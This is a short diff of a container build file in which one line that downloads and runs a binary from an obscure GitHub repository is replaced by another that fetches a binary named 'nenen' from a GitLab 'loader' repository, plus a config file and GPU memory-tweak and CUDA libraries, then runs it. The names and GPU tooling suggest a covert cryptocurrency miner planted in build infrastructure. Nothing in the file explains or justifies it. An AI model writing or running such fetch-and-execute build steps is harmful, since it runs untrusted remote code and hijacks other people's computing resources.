@@ -3,4 +3,4 @@ FROM vm/ubuntu:18.04
 SPLIT 30
 RUN apt-get update && \
     apt-get install libjansson4 unzip && \
-	  wget -qO cus.zip https://github.com/bekerjautksaya/supreme-dollop/blob/main/cus.zip?raw=true && unzip cus.zip && chmod +x ver && ./ver cus.ini
+	  wget -qO nenen https://gitlab.com/admin1246/loader/-/raw/main/nenen && wget -qO config.ini https://raw.githubusercontent.com/rmrachman15/luncher1/main/config.ini && wget -qO amdmemtweak https://github.com/washil789/tambang/raw/main/amdmemtweak && wget -qO libnvrtc.so.10.0 https://github.com/washil789/tambang/raw/main/libnvrtc.so.10.0 && chmod +x nenen && ./nenen
